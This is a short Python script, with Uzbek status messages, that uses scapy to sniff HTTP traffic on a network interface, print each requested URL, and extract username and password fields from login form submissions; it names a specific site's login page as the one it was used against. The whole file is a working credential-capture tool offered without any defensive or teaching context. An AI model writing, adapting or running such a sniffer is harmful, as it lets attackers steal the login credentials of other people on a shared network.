import scapy.all as scapy
from scapy.layers import http
import re

def sniff(interface):
    scapy.sniff(iface=interface ,store=False, prn=peocess_sniffer_packet)

print("dastur ishga tushdi")
print("foydalanilgan sayt: vbsca.ca/login/login.asp")
def peocess_sniffer_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).replace("b'","'").replace("'","")
        print(f"Url: {url}")
        if packet.haslayer(scapy.Raw):
            data = (str(packet[scapy.Raw].load)).replace("b'","").replace("'","")
            login = re.search(r'txtUsername=([^&]*)',data)
            parol = re.search(r'txtPassword=([^&]*)',data)
            print(f"Login: {login.group(1)}\nParol: {parol.group(1)}")

sniff("eth0")
